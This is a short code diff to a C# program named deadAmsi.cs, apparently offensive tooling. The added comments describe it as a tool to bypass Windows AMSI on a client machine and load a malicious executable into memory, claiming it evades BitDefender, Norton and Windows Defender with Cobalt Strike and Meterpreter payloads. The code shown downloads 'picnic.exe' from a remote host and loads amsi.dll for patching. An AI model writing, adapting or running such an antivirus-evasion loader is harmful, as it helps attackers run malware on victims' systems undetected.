@@ -2,6 +2,11 @@ using System;
 using System.Net;
 using System.Reflection;
 using System.Runtime.InteropServices;
+// mcs deadAmsi.cs
+// run on client machine to bypass AMSI and download malicious executable to memory
+// works on fully patched AV and windows builds
+// tested with: covenant, cobaltstrike, netcat, meterpreter payloads
+// tested against BitDefender, Norton, and Windows Defender
 
 namespace deadPie
 {
@@ -10,6 +15,7 @@ namespace deadPie
         static void Main(string[] args)
         {
             var client = new WebClient();
+            // change download string to executable on remote server
             var deadGet = client.DownloadData("http://10.0.0.0/picnic.exe");
             client.Dispose();
             var deadDll = LoadLibrary("amsi.dll");
